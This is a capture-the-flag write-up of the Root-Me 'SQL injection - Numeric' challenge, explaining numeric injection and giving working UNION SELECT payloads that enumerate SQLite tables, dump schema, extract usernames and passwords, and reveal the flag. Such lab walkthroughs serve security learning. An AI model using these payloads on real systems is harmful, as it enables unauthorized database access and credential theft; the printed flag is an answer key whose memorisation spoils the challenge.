## Challenge name: SQL injection - Numeric


<img width="1357" height="414" alt="image" src="https://github.com/user-attachments/assets/bc2e2502-e09e-450a-8769-0975e88ac24c" />
<br>
<br>

``` Challenge Link:``` [https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Numeric](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Numeric)
<br>
<br>

**After starting the challenge we can see a bunch of features in site in home we have some published one liner notices and inside that some words on home page and also a login page..**

<br>
<img width="2549" height="376" alt="image" src="https://github.com/user-attachments/assets/4d002535-9e8f-4c2f-9c60-64f590f836c7" />
<br>
<br>

**In parameter news_id when I didn't passed any id it gave err so I am sure that sql injection is possible and it has also leaked which sql is being used as SQLite3 while giving error message in web..**

<br>
<img width="1250" height="376" alt="image" src="https://github.com/user-attachments/assets/40b8f4a8-0fc4-4ea5-9e27-bed18565d324" />
<br>
<br>

**Now lets understand what's SQL injection - Numeric is: Numeric SQL injection is an attack where an attacker manipulates number-based input fields (like IDs or quantities) to alter an SQL query and gain unauthorized access or control over a database. Because the backend query is almost certainly like this:**

```
eg: SELECT title, content, date FROM news WHERE id = 2
```

**news_id is used as an integer, not as a string.**
<br><br>
**So when you inject payload: `2 union select 1,tbl_name,3 from sqlite_master` it becomes:**

```
SELECT title, content, date FROM news WHERE id = 2
union select 1,tbl_name,3 from sqlite_master              // SQLite‑specific syntax extracts table names from the database schema and the reason to use union select is UNION combines the results of this SELECT with the results of a previous SELECT so now you can see results in web of your query that you are adding bellow as shown using that union select its sql syntax and we gotta learn it..
```

**After visiting `http://challenge01.root-me.org/web-serveur/ch18/?action=news&news_id=2%20union%20select%201,tbl_name,3%20from%20sqlite_master` we can see db's names:**

<br>
<img width="1250" height="376" alt="image" src="https://github.com/user-attachments/assets/b49e6ad0-bce9-4e90-8fe0-906ac286e958" />
<br>
<br>

**So now we know that users table exists now we need to know the fields or columns inside it to fetch data using that column names..**
<br><br>
**I tryed using `UNION SELECT 1, sql, 3 FROM sqlite_master WHERE tbl_name='users'` but in `tbl_name='users'` the quote `''` there messed up with syntax shown earlier and thought to dump CREATE TABLE progressively so no WHERE quotes no probles and I used:**

```
2 UNION SELECT 1,substr(sql,1,200),3 FROM sqlite_master     // It looks for the line containing CREATE TABLE <tablename> ( <its_columns_data_passed_when_created> )..
```

**After we visit site `http://challenge01.root-me.org/web-serveur/ch18/?action=news&news_id=2%20union%20select%201,substr(sql,1,200),3%20from%20sqlite_master` we can see we got the results we wanted:**

<br>
<img width="1250" height="376" alt="image" src="https://github.com/user-attachments/assets/80354046-b795-4485-8d0a-bce7709f7327" />
<br>
<br>

**Now we will fetch username and password column form users table using `union select 1,username,password from users` So, our final payload becomes:**

```
http://challenge01.root-me.org/web-serveur/ch18/?action=news&news_id=2 union select 1,username,password from users
```

<br>
<img width="1250" height="342" alt="image" src="https://github.com/user-attachments/assets/236bc790-9c2a-444c-9c61-29cb482cc7a7" />
<br>
<br>

**And hell yeah we got the flag and we will use this "aTlkJYLjcbLmue3" as flag/passwd to validate the challenge..** <br><br>
**Thankyou.**
